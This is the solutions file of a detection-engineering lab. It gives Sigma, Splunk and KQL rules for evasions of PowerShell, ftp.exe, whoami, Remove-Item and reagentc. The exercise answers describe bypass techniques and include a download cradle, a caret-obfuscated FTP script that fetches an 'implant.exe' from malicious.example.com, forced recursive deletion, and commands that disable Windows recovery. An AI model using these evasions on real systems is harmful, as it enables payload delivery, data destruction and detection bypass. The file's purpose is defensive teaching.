# Solutions

> **Spoiler warning.** Below are worked answers to every exercise. The whole value of this lab is in *attempting* the exercises before reading the answers. The solutions are wrapped in `<details>` tags — clicking a row expands it. Try not to click before you've thought.

These solutions are the maintainers' answers, not the only valid ones. Detection engineering is a craft — there are usually multiple correct designs. If your answer differs and you can defend it, that's a good sign.

---

## Demo 01 — Parameter Variation

### Hardened Rule (Maintainer's Take)

The maintainers' rule for this demo. Yours may be different and still correct — defend your choices.

```yaml
title: PowerShell Encoded Command (Hardened)
id: 11111111-1111-1111-1111-000000000002
status: stable
description: Detects PowerShell launched with any encoded-command flag variation
logsource:
  product: windows
  category: process_creation
detection:
  selection_image:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  selection_ofn:
    OriginalFileName:
      - 'PowerShell.EXE'
      - 'pwsh.dll'
  selection_flag:
    CommandLine|re|i: '(?:^|\s)[-\/\x{2013}\x{2014}\x{2015}](e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand)\b'
  condition: (selection_image or selection_ofn) and selection_flag
falsepositives:
  - Legitimate scheduled tasks (rare — most use script files, not encoded commands)
level: high
```

The `re|i` regex covers every valid prefix of `EncodedCommand` from `e` to the full word, the `ec` alias, and all five prefix characters the parser accepts — `-`, `/`, en dash (U+2013), em dash (U+2014), horizontal bar (U+2015). That is the full set of 75 spellings, measured; a plain `[-\/]` covers only 30. The leading `(?:^|\s)` anchors the flag to the start of a token so the rule doesn't fire on a benign path or URL that happens to contain `-e` or `/e` (or on the `/` and `+` inside the base64 payload itself), and the trailing `\b` stops `-encodedcommandx`. Do **not** swap the character class for `\p{Pd}` — the accepted set is a hardcoded list, and `\p{Pd}` also matches U+2010/U+2011/U+2012/U+2212, which don't work, widening your false-positive surface for nothing.

<details>
<summary><b>1.</b></summary>

**Splunk SPL:**
```spl
index=windows EventCode=4688
| Image IN ("*\\powershell.exe", "*\\pwsh.exe")
| eval CommandLine_norm=lower(CommandLine)
| regex CommandLine_norm="(?i)(?:^|\s)[-\/\x{2013}\x{2014}\x{2015}](e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand)\b"
```

**KQL (Microsoft Sentinel):**
```kql
DeviceProcessEvents
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine matches regex @"(?i)(?:^|\s)[-\/\x{2013}\x{2014}\x{2015}](e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand)\b"
```

The shape is the same across SIEMs: filter to the PowerShell binary, then regex-match every valid prefix of `EncodedCommand` with `-`,`/` or the other unicode variants prefix. Adapt the field names and regex syntax to your platform.
</details>

<details>
<summary><b>2.</b></summary>

Any of these execute hostile code without ever using `-EncodedCommand`:

- **`-Command` / `-c`** — passes a string of PowerShell to execute.
- **`-File` / `-f`** — runs a `.ps1`, so the hostile code lives in the file and never touches the command line.
- **`-NoProfile -ExecutionPolicy Bypass -Command "iex (New-Object Net.WebClient).DownloadString(...)"`** — the classic web cradle. Note `-ex`, `-exe`, `-exec` and `-ep` all bind `-ExecutionPolicy`, and `-ep` is not a prefix of it — another hardcoded alias, so the ordered-list behaviour isn't unique to `-EncodedCommand`.
- **stdin with no flag at all.** `'Write-Output hi' | powershell.exe` executes, and so does `powershell -Command -`. There is no flag in the command line to match on — the sharpest one on the list.
- **`-EncodedArguments`** — the interesting one, because the obvious reading is wrong. It is a real parameter on **both** hosts, undocumented in `-Help` on **both**, and it is **not an execution path**. It carries *arguments*, not a command, so on its own it runs nothing; it needs a `-File` (or `-Command`) alongside it, and must appear **before** `-File`. The payload is CLIXML, not a base64 command:

  ```powershell
  $clixml = [System.Management.Automation.PSSerializer]::Serialize(@('alpha','bravo'))
  $b64    = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($clixml))
  powershell.exe -EncodedArguments $b64 -File .\script.ps1   # -> $First=alpha  $Second=bravo
  ```

  | Behaviour | Result |
  |---|---|
  | `-EncodedArguments <b64>` with no `-File` / `-Command` | executes nothing — drops to an interactive shell |
  | `-EncodedArguments` placed **after** `-File` | ignored; `-File` consumes everything after it as script args |
  | payload is a base64 *command* rather than CLIXML | rejected on both hosts |

  On a *bad* payload the two hosts behave the same way, not differently: both print the usage banner **and** emit `... value specified with -EncodedArguments is not properly encoded. The value must be Base64 encoded.` (measured on 5.1.19041 and 7.6.3, with stdin at EOF so neither drops to an interactive prompt). What *does* differ is the response to a genuinely unknown flag: 5.1 raises a `CommandNotFoundException` naming the token, while pwsh prints `... is not recognized as the name of a script file` followed by its usage banner. The detection angle isn't code execution: an attacker can feed a C2 address, key or target list into a dropped script with none of it readable in the `CommandLine` field.

The ADE2 lesson: every flag the rule didn't enumerate is a free ride.
</details>

<details>
<summary><b>3.</b></summary>

The instinct is to reach for exotic whitespace between the flag and the base64. Test it before you trust it — most of it does not work. Measured through `cmd.exe`, as the separator between `-enc` and its value:

| Separator | Result |
|---|---|
| space, or two-or-more spaces | works |
| TAB (U+0009) | works |
| NBSP (U+00A0), vertical tab, form feed, en quad (U+2000), ideographic space (U+3000) | **fail** |

So a working combined payload is `powershell.exe<TAB>-EC<TAB><base64>`, while `powershell.exe<TAB>-EC<NBSP><base64>` — which looks entirely plausible — does not run at all. (NBSP *is* accepted between the image name and the first flag, but not between a flag and its value: two positions, two parsers — cmd's tokenizer versus PowerShell's argument parser.)

Does the hardened rule still catch the working version? Yes. The rule never matches whitespace between the image and the flag — binary identity comes from `Image` / `OriginalFileName`, which are OS process metadata and immune to command-line whitespace — and the only whitespace the regex cares about is the `(?:^|\s)` anchor, which TAB satisfies. The general lesson: every literal you take out of the command line is one fewer primitive an attacker can compose against you.
</details>

<details>
<summary><b>4.</b></summary>

```
trigger: PowerShell Script Block Logging (Event 4104)
condition: ScriptBlockText contains a base64 decode primitive:
   - [Convert]::FromBase64String
   - [System.Convert]::FromBase64String
  AND ScriptBlockText also contains an execution primitive:
   - IEX / Invoke-Expression
   - & (call operator)
   - . (dot-source operator)
   - [scriptblock]::Create
   - Invoke-Command
emit: behavioral alert, severity high
telemetry: Script Block Logging (4104) — single event, both signals in one block
```

Single telemetry source, no cross-event correlation. The core insight: `FromBase64String` alone is occasionally benign (certificate handling, config parsing). `FromBase64String` + an execution primitive is more interesting — that's decode-then-run, the exact pattern download cradles use.
</details>

---

## Demo 02 — Fragmentation & Chaining

### Hardened Detection Strategy (Maintainer's Take)

The fix isn't a single rule — it's a **multi-event correlation** that reads the underlying behavior. The maintainers' approach has three parts:

**Part 1.** A single-event Sigma rule that flags `ftp.exe` invoked with the `-s:` script flag (and equivalents for other LOLBins). Useful as a tripwire and for pivoting.

```yaml
title: FTP Script-Mode Execution (Hardened, Behavioral)
id: 22222222-2222-2222-2222-000000000002
status: stable
description: Detects ftp.exe invoked with a script (-s:) flag — pivots to file-content review
logsource:
  product: windows
  category: process_creation
detection:
  selection_image:
    Image|endswith: '\ftp.exe'
  selection_ofn:
    OriginalFileName: 'ftp.exe'
  selection_flag:
    CommandLine|re|i: '\s[-/]s:'
  filter_legit:
    ParentImage|endswith:
      - '\KnownDeployTool.exe'
  condition: (selection_image or selection_ofn) and selection_flag and not filter_legit
level: high
fields:
  - CommandLine
  - ParentImage
  - User
```

**Part 2.** A correlation rule (Sigma correlation, SecOps multi-event, Splunk transaction, etc.) that joins:

- An `EventID 11` (FileCreate) for any text-like file (`.txt`, `.bat`, `.ps1`, `.vbs`, `.js`)
- An `EventID 1` (ProcessCreate) whose `CommandLine` contains the path of the file from Event 11
- Within ~30 seconds, same User SID

**Part 3.** An enrichment step that surfaces the *contents* of the script file. Sysmon FileCreate (EID 11) is *not* a content source — it reports the path and the writing process, which is the *trigger* to go collect the file; the content itself comes from EDR file-content telemetry, a write-time YARA scan, or endpoint file acquisition.

The tradeoff: Part 1 is cheap and fires immediately on `ftp.exe -s:` — but only on `ftp.exe`. Part 2 is general but expensive and FP-prone in dev environments. Most production deployments do both: Part 1 for cheap tripwires per binary, Part 2 for catch-all behavioral coverage.

<details>
<summary><b>1.</b></summary>

ADE2 would be "the rule looks for `ftp.exe` but missed `tftp.exe`" — a missed alternative for the *same unit of analysis* (the binary name). This bypass is different: the rule's unit of analysis is **the single process-creation event**, but the attack's unit of analysis is **a sequence of events** (file create → process execute → script-driven download). The rule is looking at the wrong thing entirely. That's a *correlation/context* problem, which is ADE3.
</details>

<details>
<summary><b>2.</b></summary>

| Binary | Script-input flag | Pattern |
|--------|-------------------|---------|
| `cmd.exe` | `/c` (one-shot) or `/k` (then interactive) | Write `.bat`, run `cmd /c file.bat` |
| `powershell.exe` | `-File` | Write `.ps1`, run `powershell -File file.ps1` |
| `cscript.exe` / `wscript.exe` | (positional script path) | Write `.vbs` or `.js`, run `cscript file.vbs` |
</details>

<details>
<summary><b>3.</b></summary>

Two strategies:
1. **Use a non-FTP binary that the rule doesn't watch.** `bitsadmin /transfer`, `certutil -urlcache`, `curl.exe` (built-in on Win10+), `Invoke-WebRequest` from PowerShell — all download files without `ftp.exe`. The hardened rule fires only on `ftp.exe -s:`.
2. **Use FTP without the script flag.** Pipe the FTP commands into `ftp.exe` via stdin — `cmd /c "echo open ... | ftp.exe"`. The command line now contains `ftp.exe` but no `-s:` flag. (The hardened rule fires only when `-s:` is present.)
</details>

<details>
<summary><b>4.</b></summary>

```cmd
:: Stage 1 — write each command piecemeal across many writes
echo o^pen mal^icious.example.com 21 > %TEMP%\a.txt   (caret obfuscation in cmd)
echo us^er a^ttacker pas^sword       >> %TEMP%\a.txt
echo bin^ary                          >> %TEMP%\a.txt
echo g^et impl^ant.exe                >> %TEMP%\a.txt
echo bye                              >> %TEMP%\a.txt

:: Stage 2 — execute (innocuous)
ftp.exe -s:%TEMP%\a.txt
```

`cmd.exe` strips the carets at parse time, so the file ends up containing the clean strings. Now the rule that *reads the file content* sees normal-looking FTP commands. Next layer: encode the file contents via `certutil -decode`, then pipe to `ftp.exe`. The next defense is **YARA on the file content at write-time** — but YARA can't keep up with arbitrary obfuscation. The real defense is behavioral chaining (`process X writes file Y, then process X runs ftp.exe -s:Y within 30s`) — that catches the *pattern* regardless of the file content.
</details>

<details>
<summary><b>5.</b></summary>

```
event_a: File creation (Sysmon EID 11) of a text-like file (.txt, .bat, .ps1, .vbs, .js)
event_b: Process creation (Sysmon EID 1) of any process whose CommandLine contains
         the path of the file from event_a
join_key: same User SID, same path
window: 30 seconds (a → b)
condition: not (parent of event_b is a known build/deploy tool)
```

Telemetry: Sysmon EID 11 + EID 1, both correlated on file path. False-positive surface is high in dev environments (compilers, build tools constantly write+read files). Scope to non-developer machines or whitelist parent processes aggressively.
</details>

---

## Demo 03 — Whitespace Manipulation

### Hardened Rule (Maintainer's Take)

Two approaches, both valid.

**Approach A — Whitespace-tolerant regex on CommandLine.** Anchor binary identity to the `Image` field (populated from OS process metadata, not the raw command line — so command-line whitespace tricks don't affect it), then use `\s+` to match any non-zero run of whitespace before the flag — fixes the vulnerable rule from the demo directly:

```yaml
title: ipconfig /all Recon (Hardened, Whitespace-Resilient)
id: 33333333-3333-3333-3333-000000000002
status: stable
description: Detects ipconfig /all execution regardless of whitespace count
logsource:
  product: windows
  category: process_creation
detection:
  selection_image:
    Image|endswith: '\ipconfig.exe'
  selection_ofn:
    OriginalFileName: 'ipconfig.exe'
  selection_flag:
    CommandLine|re|i: '\s*/all\b'
  condition: (selection_image or selection_ofn) and selection_flag
falsepositives:
  - Helpdesk diagnostic scripts (scope by parent process or user)
level: low
```

The same shape works for any recon binary — swap the `Image` and tweak the flag regex. The key move: anchor binary identity to `Image`, anchor the flag pattern to a whitespace-tolerant regex on `CommandLine`. The naive `'ipconfig /all'` literal becomes the resilient `Image|endswith: '\ipconfig.exe'` + `'\s*/all\b'` pair. Note `\s*`, not `\s+`: `cmd.exe` happily runs `ipconfig/all` with no space at all, so requiring at least one whitespace character would leave a one-byte bypass in a demo that is specifically about whitespace. The trailing `\b` still keeps `/allcompartments` out.

**Approach B — Drop the command-line literal entirely.** When the threat is the *binary itself* spawning under a suspicious parent (rather than a specific flag), detect on the child process's `Image` and use parent context for filtering. Worked here for `whoami` — exercises 2 and 4 build on this:

```yaml
detection:
  selection_image:
    Image|endswith: '\whoami.exe'
  selection_ofn:
    OriginalFileName: 'whoami.exe'
  selection_parent:
    ParentImage|endswith: '\cmd.exe'
  condition: (selection_image or selection_ofn) and selection_parent
```

Approach B sidesteps command-line whitespace entirely because it matches on `Image` — populated from OS process metadata, not parsed from the raw `CommandLine`. The `whoami` *binary* is what matters; the spelling of the command line is incidental. The cost: you lose information about *what flags* were passed (e.g., `whoami /all` vs. plain `whoami`). For most workflows that's an acceptable trade.

<details>
<summary><b>1.</b></summary>

ADE1 (Reformatting) is about *the bytes the rule sees being different from what the rule's author imagined* — the parser or the attacker produces a different string than the canonical one. ADE4 (Logic Manipulation) is about *the rule's own logical structure being broken* — wrong AND/OR composition, an inverted negation, an incorrect expression that makes the rule fail to fire on data that should match. Whitespace manipulation is an ADE1 case: the rule's logic could be perfectly composed; the literal it's matching against just doesn't account for the actual bytes the parser produces. (An ADE4 example would be a rule with `condition: selection_a and not selection_b` where `selection_b` is unintentionally too broad and silently negates legitimate matches — the logic itself is wrong, regardless of what data flows through.)
</details>

<details>
<summary><b>2.</b></summary>

Two paths:

1. **Use a different binary entirely.** `Get-WmiObject Win32_ComputerSystem` (PowerShell), `[System.Security.Principal.WindowsIdentity]::GetCurrent().Name` (.NET), or simply reading `$env:USERNAME` returns user-identity recon without invoking `whoami.exe` at all. Your tokenized regex fires on zero events because no `whoami` process spawns.

2. **Invoke `whoami.exe` directly without `cmd.exe /c`.** The hardened rule's `Image|endswith: '\cmd.exe'` clause requires cmd to be the parent. If the attacker spawns `whoami.exe` directly from PowerShell, a scheduled task, a service, or any other parent, the rule misses entirely — the regex never gets a chance to evaluate.

The lesson: tokenized regexes still depend on assumptions about the *invocation chain* (parent = cmd.exe). Image-based detection on `whoami.exe` itself (Approach B above) is the only fix that catches both of these, because it doesn't care about the parent or the command-line shape.
</details>

<details>
<summary><b>3.</b></summary>

`cmd.exe  /c  "who"a"mi"` — extra spaces between every token, plus quote splicing inside the binary name. The hardened rule needs **two** primitives at the regex layer: `\s+` for whitespace tolerance, and a quote-strip normalization step before matching. Each ADE1 primitive composes with every other one — the rule's complexity grows multiplicatively if you stay at the command-line layer. Approach B (matching on Image) sidesteps both problems at once, which is exactly why behavioral / parsed-field detection scales better than command-line regex over time.
</details>

<details>
<summary><b>4.</b></summary>

Baseline `whoami.exe` is benign (admin scripts, helpdesk tools, vendor agents). Suspicious is `whoami.exe` from an unusual *parent*. Scoring framework:

- Base score: 1 (any whoami)
- +3 if parent is in `{winword.exe, excel.exe, outlook.exe, chrome.exe, firefox.exe}`
- +2 if parent process is unsigned
- +2 if user is non-admin
- +3 if accompanied by other recon binaries within 60s from the same parent (chain — see Demo 06)

Alert threshold: score ≥ 5. Most baseline whoami invocations score 1; chained recon from a browser scores 7+. The risk-score model lets you ship the Image-based rule without burning the SOC on every benign whoami.
</details>

---

## Demo 04 — Boolean Replacement

### Hardened Rule (Maintainer's Take)

Detect on the **parameter name** (which is a small, stable set), not the value:

```yaml
title: Forced Recursive Removal (Hardened)
id: 44444444-4444-4444-4444-000000000002
status: stable
description: Detects PowerShell forced-recursive removal regardless of boolean syntax
logsource:
  product: windows
  category: ps_script
detection:
  selection_cmd:
    ScriptBlockText|re|i: '\b(Remove-Item|rmdir|del|erase|rd|rm|ri)\b'
  selection_force:
    ScriptBlockText|re|i: '-Force\b'
  selection_recurse:
    ScriptBlockText|re|i: '-Recurse\b'
  condition: selection_cmd and selection_force and selection_recurse
falsepositives:
  - Cleanup scripts (consider scoping by user, path, or parent process)
level: high
```

Even better: detect the **resulting behavior** — Sysmon file-deletion events on watched paths, aggregated as "process X deleted N files in directory Y in T seconds." Use **EID 26 (FileDeleteDetected, Sysmon 13.10+)** for the count: it records the deletion without keeping a copy. Avoid **EID 23 (FileDelete)** for high-volume aggregation — it *archives every deleted file* to the Sysmon archive directory, so a mass-deletion / ransomware event (exactly what you are hunting) can balloon that directory without bound; reserve EID 23 for a few tightly-scoped, high-value paths where retaining the deleted bytes is intentional. Either way the behavioral rule is the real catch because it fires regardless of how the deletion was invoked (PowerShell, cmd, .NET API, Win32 API).

<details>
<summary><b>1.</b></summary>

Engineers write detection rules from documentation and code samples, both of which use the canonical form. Documentation says "use `-Force:$true` to suppress prompts" — so the rule says `'-Force:$true'`. Adversaries write rules from *runtime behavior* — they care what the parser accepts, not what the docs recommend. The gap is a classic case of *availability bias*: engineers detect what they *write*, not what attackers *can write*.
</details>

<details>
<summary><b>2.</b></summary>

- `rm -rf` (canonical)
- `rm -fr` (flag order)
- `rm -r -f` (flags split)
- `rm --recursive --force` (long form)
- `rm -r --force` (mixed)
- `\rm -rf` (defeats shell aliases that wrap rm)
- `'rm' -rf` or `"rm" -rf` (quote tricks)
- `/bin/rm -rf` (full path defeats alias and PATH-based detection)

Plus combinations with whitespace, environment-variable expansion, and `xargs`/`find -delete` to avoid `rm` entirely.
</details>

<details>
<summary><b>3.</b></summary>

`Get-ChildItem -Path C:\target -Recurse | Remove-Item -Force` achieves the same result. `Get-ChildItem -Recurse` walks the tree; `Remove-Item -Force` deletes each item without prompting. The hardened rule from Demo 04 requires the conjunction of `Remove-Item-family + -Force + -Recurse`. This bypass uses `-Recurse` on a *different cmdlet* (`Get-ChildItem`), so the rule's selection_recurse fires on the wrong line and the conjunction may not hold within the same script block.

Other options: `[System.IO.Directory]::Delete($path, $true)` (.NET API directly), `cmd /c rd /s /q $path` (shell out to `rd`).
</details>

<details>
<summary><b>4.</b></summary>

```powershell
$cmd = ('Re' + 'move-' + 'Item')
&$cmd -Path 'C:\sensitive' -Recurse -Force
```

Without Script Block Logging, the command line contains no `Remove-Item` substring. With Script Block Logging (Event 4104), the *entire script* is logged including the concatenation — the rule sees `'Re' + 'move-' + 'Item'` plus `&$cmd`, and a sufficiently smart regex catches the concat-then-invoke pattern. SBL is what saves the rule. SBL isn't always enabled because of: log volume concerns, group-policy lag, and historical perception that PowerShell logging is "noisy."
</details>

<details>
<summary><b>5.</b></summary>

```
trigger: Sysmon file-deletion events — EID 26 (FileDeleteDetected, Sysmon 13.10+) for broad count-based detection; EID 23 (FileDelete, Sysmon 11+) only on tightly-scoped paths, since it archives every deleted file
filter: TargetFilename matches sensitive prefix list (Documents, Desktop, network shares)
aggregate: count by ProcessGuid over 60-second window
threshold: count >= 100 distinct file paths
emit: alert with ProcessGuid, parent process, file count, sample paths
```

N = 100, T = 60s is a good starting point — most legitimate cleanup runs at < 30 files; ransomware and wipers commonly hit thousands per minute. Tune by environment.
</details>

---

## Demo 05 — Quote Manipulation

### Hardened Rule (Maintainer's Take)

The fix is a **layered detection**. No single Sigma rule cleanly catches both the quote-spliced flag and the alternative paths, so the maintainers ship two complementary rules.

**Layer 1 — Quote-tolerant flag matching on reagentc.exe.** Allow optional quote characters between every letter of `disable`, anchored to the resolved `Image`:

```yaml
title: Windows Recovery Environment Disabled - reagentc (Hardened)
id: 55555555-5555-5555-5555-000000000002
status: stable
description: Detects reagentc.exe /disable regardless of quote splicing in the flag
logsource:
  product: windows
  category: process_creation
detection:
  selection_image:
    Image|endswith: '\reagentc.exe'
  selection_ofn:
    OriginalFileName: 'reagentc.exe'
  selection_flag:
    CommandLine|re|i: "\/[\"'`]*d[\"'`]*i[\"'`]*s[\"'`]*a[\"'`]*b[\"'`]*l[\"'`]*e"
  condition: (selection_image or selection_ofn) and selection_flag
level: high
```

The regex allows zero-or-more quote characters (`"`, `'`, backtick) between every literal letter, defeating any in-token splicing. There is deliberately **no** `filter_legit` clause: an earlier draft added `not (CommandLine contains /enable|/info|/boottore)`, but that is both redundant and dangerous. Redundant because `selection_flag` matches the letters of `disable` specifically — `/enable`, `/info` and `/boottore` never match it in the first place. Dangerous because a whole-command-line `not` filter is a free bypass: `reagentc.exe /disable /info` contains `/info`, so the filter would suppress a real disable. Rely on `selection_flag` alone, which fires on `/disable` (and every quote-spliced form) while staying silent on the legitimate flags.

**Layer 2 — Behavioral side-effect detection.** The paths that disable WRE or suppress its automatic recovery converge on two artifacts: the **BCD store's `recoveryenabled` element** and the **`ReAgent.xml`** config file. `reagentc /disable`, `bcdedit /set {default} recoveryenabled No`, and a direct edit of the BCD hive all clear that BCD element (verified by reverse-engineering `ReAgent.dll`, which calls `BcdSetElementData(recoveryenabled)`); `reagentc` additionally rewrites `ReAgent.xml`. This rule watches both, plus the two known command-line paths:

```yaml
title: Windows Recovery Capability Impaired - Behavioral (Hardened)
id: 55555555-5555-5555-5555-000000000003
status: stable
description: |
  Detects Windows recovery capability being impaired: WinRE disabled via reagentc.exe,
  automatic recovery suppressed via bcdedit, or a direct BCD/ReAgent.xml edit. Per MITRE
  T1490 these are distinct outcomes (reagentc /disable turns WinRE off; recoveryenabled No
  suppresses automatic recovery), yet they clear the same BCD element, so one rule catches
  either. There is no single registry value every path touches, so several selections are
  OR-ed together.
logsource:
  product: windows
detection:
  # (a) reagentc rewrites its config file on /disable (FileCreate fires on overwrite too)
  selection_reagent_xml:
    EventID:
      - 11   # Sysmon FileCreate
      - 23   # Sysmon FileDelete (archives the file; fine here — one scoped path)
      - 26   # Sysmon FileDeleteDetected (no archive; Sysmon 13.10+)
    TargetFilename|endswith: '\System32\Recovery\ReAgent.xml'
  # (b) the BCD store is the registry hive HKLM\BCD00000000; reagentc, bcdedit and
  #     direct edits all clear the recoveryenabled element on the OS-loader object.
  #     Broad by design - tune TargetObject to the recoveryenabled element id
  #     (\Elements\16000009\) on your build to cut noise from unrelated boot-config writes.
  selection_bcd_registry:
    EventID: 13   # Sysmon RegistryEvent (Value Set)
    TargetObject|contains: '\BCD00000000\'
  # (c) command-line paths
  selection_reagentc_proc:
    EventID: 1
    Image|endswith: '\reagentc.exe'
    CommandLine|re|i: "\/[\"'`]*d[\"'`]*i[\"'`]*s[\"'`]*a[\"'`]*b[\"'`]*l[\"'`]*e"
  selection_bcdedit_proc:
    EventID: 1
    Image|endswith: '\bcdedit.exe'
    CommandLine|re|i: 'recoveryenabled\s+["''`]*(no|0|false)'
  condition: selection_reagent_xml or selection_bcd_registry or selection_reagentc_proc or selection_bcdedit_proc
level: high
```

The lesson: when the threat is *a flag*, not *a binary*, you need both a quote-tolerant flag detection and a side-effect detection that catches every alternative path. Image-only would be a false-positive disaster; CommandLine-literal dies to the bypass; only the layered combination is robust.

> **A note on what does — and does not — share the side effect.** An earlier draft matched `TargetObject|contains: '\Control\WinRE'` and claimed the rule also caught DISM. Both were wrong. There is no `...\Control\WinRE` registry key on Windows 10/11 — WinRE state lives in `ReAgent.xml` and the BCD store — and a `contains` match on that string collides with the unrelated `...\Control\Winresume` (the resume-from-hibernation loader), producing false positives and zero true positives. And DISM has no WinRE enable/disable verb at all (`WindowsRecoveryEnvironment` is not a DISM feature name — confirmed against `dism.exe`), so it was never a disable path to catch. `reagentc`, `bcdedit` and direct BCD/`ReAgent.xml` edits *do* share the side effect — the BCD `recoveryenabled` element — which is what the rule above keys on. Also note `\Boot\BCD` is only a visible file on BIOS/MBR systems; on UEFI the store lives on the (usually unmounted) EFI System Partition, so watch the `BCD00000000` registry hive rather than a file path. One nuance for triage: `reagentc /disable` also relocates `Winre.wim` and rewrites `ReAgent.xml`, so `reagentc /info` then reports *Disabled*; a bare `bcdedit /set {default} recoveryenabled No` flips only the BCD element, so `reagentc /info` can still read *Enabled* even though automatic recovery is suppressed. Both write the BCD hive, so the rule fires on either — treat a bcdedit-only hit as *recovery impaired* pending confirmation via `reagentc /info`.

<details>
<summary><b>1.</b></summary>

`Image|endswith` closes the ADE1 *reformatting* bypasses (quote / space / case tricks on the command line) when the *binary itself* is the threat. `mimikatz.exe`, `procdump.exe`, `psexec.exe`, `nmap.exe` - these have no legitimate use on most workstations, so firing on the Image field alone is acceptable and the false-positive surface is essentially zero. It is not a complete *identity* guarantee, though: `Image` matches the filename, so renaming the binary (MITRE T1036.003 - masquerading) evades it. Pair `Image` with `OriginalFileName`, signer, and hash / reputation when the adversary controls the file - a different axis (ADE2) from the reformatting problem this fix addresses.

It collapses when the binary has *legitimate uses* and only specific *flags* are sensitive. `reagentc.exe`, `bcdedit.exe`, `wmic.exe`, `net.exe`, `powershell.exe`, `regsvr32.exe` - all have benign daily roles. Firing on the Image alone produces alert floods that bury the real signal.

The takeaway for ADE1: ask first whether the threat is the *binary* or the *behavior the binary is enabling*. If binary, Image solves it. If behavior, you need quote-tolerant flag matching plus (ideally) side-effect detection.
</details>

<details>
<summary><b>2.</b></summary>

```
1. lowercase                          → "/DISABLE" → "/disable"
2. strip ASCII single & double quotes → "/dis\"\"able" → "/disable"
3. strip backticks (PowerShell)        → "/dis``able" → "/disable"
4. collapse runs of whitespace         → "/dis  able" → "/dis able" (different problem - see Demo 03)
5. pattern-match on normalized string  → contains "/disable"
```

Note what is deliberately *not* a step here: **stripping carets**. The caret is a `cmd.exe` escape, and `cmd.exe` consumes it *before* it calls `CreateProcess` — so `reagentc.exe /dis^able` reaches the reagentc process as a clean `/disable` on its own command line (measured: the child's `GetCommandLineW` shows no caret, and `argv[1]` is `/disable`). Carets only ever appear on the *wrapping* `cmd.exe` process's command line, never on the command line of the process you are detecting. Quotes and backticks are different — those *do* survive into the child's command line, which is why steps 2 and 3 are real and necessary.

Edge cases that genuinely break it:
- **Legitimate quoted paths:** if the rule strips quotes blindly, `Get-Item 'C:\Program Files\App.exe'` becomes `Get-Item C:\Program Files\App.exe` - benign, but you've changed the meaning of legitimate command lines, which can affect downstream rules.
- **PowerShell here-strings:** `@" ... "@` blocks contain quotes as content, not as delimiters; stripping them corrupts the content.

One case that *looks* like a break but isn't - if you normalize the right telemetry - is **parent-only construction:** `reagentc.exe ('/dis' + 'able')` and `$flag = "/disable"; reagentc.exe $flag` hide `/disable` from the *parent* PowerShell command line and script text, but PowerShell resolves the expression *before* it calls `CreateProcess`, so the *child* `reagentc.exe` is spawned with `/disable` on its own command line (verified: the child's `GetCommandLineW` shows `... /disable` on both 5.1 and 7.6). Layer 1 is anchored on that child (`Image|endswith: '\reagentc.exe'`), so it still fires; these tricks defeat only a rule that reads the *parent* PowerShell command line. The paths that genuinely need Layer 2 never spawn reagentc.exe at all: a direct BCD edit, an alternative binary, or deleting the image.
</details>

<details>
<summary><b>3.</b></summary>

At least three alternative paths:

1. **`bcdedit.exe`** - directly modify the BCD store: `bcdedit /set {default} recoveryenabled No`. Same outcome as reagentc /disable; entirely different binary.
2. **Direct registry / BCD writes** - the BCD store is the registry hive `HKLM\BCD00000000`; a sufficiently-privileged process can clear the `recoveryenabled` element directly via the registry API, never invoking reagentc or bcdedit.
3. **Remove the image or config** - delete, rename, or corrupt `%SystemRoot%\System32\Recovery\Winre.wim` or `ReAgent.xml` so WinRE can no longer be located and loaded. This doesn't flip a flag; it makes recovery fail by removing what it depends on.

> Two paths worth *not* listing, because they don't exist: DISM has no WinRE enable/disable verb (`WindowsRecoveryEnvironment` is not a DISM feature name — confirmed against `dism.exe`; WinRE is not managed as an optional feature), and there is no `Set-WinREStatus` PowerShell cmdlet in stock Windows (verified with `Get-Command`). The genuine PowerShell path is the same as (2) — direct registry/WMI manipulation of the BCD store.

This is exactly why the maintainer's Layer 2 rule (the behavioral side-effect detection on the BCD `recoveryenabled` element plus `ReAgent.xml`) exists. No matter which of the *real* paths the attacker picks, the side effect is invariant.
</details>

<details>
<summary><b>4.</b></summary>

`reagentc.exe  /"d"i"s"a"b"l"e` - extra spaces between binary and flag (Demo 03), plus quote splicing inside the flag (Demo 05). The Layer 1 hardened rule needs **two** primitives: `\s+` between tokens (or rely on `Image`-field matching — populated from OS process metadata, unaffected by command-line whitespace tricks), and the quote-tolerant flag regex. Approach: write the flag-matching regex such that it doesn't depend on whitespace position — anchor to `Image` for binary identity, then match the flag pattern anywhere in CommandLine. The two primitives don't multiply if you keep the matchers independent.
</details>

<details>
<summary><b>5.</b></summary>

The behavioral invariant: WRE-disable always modifies one of a small set of registry / BCD / file artifacts, regardless of which binary performed the modification.

```
behavioral signal: any process performs ONE OR MORE of:
  - Sysmon EID 13 (RegistryEvent ValueSet) on TargetObject containing
    "\BCD00000000\" (the BCD hive) — ideally scoped to the recoveryenabled
    element "\Elements\16000009\" to cut noise from unrelated boot-config writes
  - Sysmon EID 11 (FileCreate) or EID 23/26 (FileDelete / FileDeleteDetected) on:
      \System32\Recovery\ReAgent.xml       (reagentc rewrites this on /disable)
      \Recovery\WindowsRE\Winre.wim        (removed/relocated when WRE is torn down)
  - Process creation (EID 1) of bcdedit.exe with CommandLine matching
    /recoveryenabled\s+["'`]*(no|0|false)/i
  - Process creation of reagentc.exe with the quote-tolerant /disable regex
    from Layer 1
emit when: any of the above signals observed
context fields: ProcessGuid, ParentImage, User, OriginalFileName
```

This catches the real paths - reagentc, bcdedit, and direct registry/BCD writes - because they all converge on the same side effect: the BCD `recoveryenabled` element (and, for reagentc, `ReAgent.xml`). Note what is *not* here: there is no `\Control\WinRE` registry key to watch (WinRE state lives in `ReAgent.xml` + BCD), and DISM is not a WRE-disable path. The unit of analysis moves from "the command line" to "the side effect," which retires the entire ADE1 family for this particular threat.
</details>

---

## Demo 06 — Delimiter Manipulation

### Hardened Detection (Maintainer's Take)

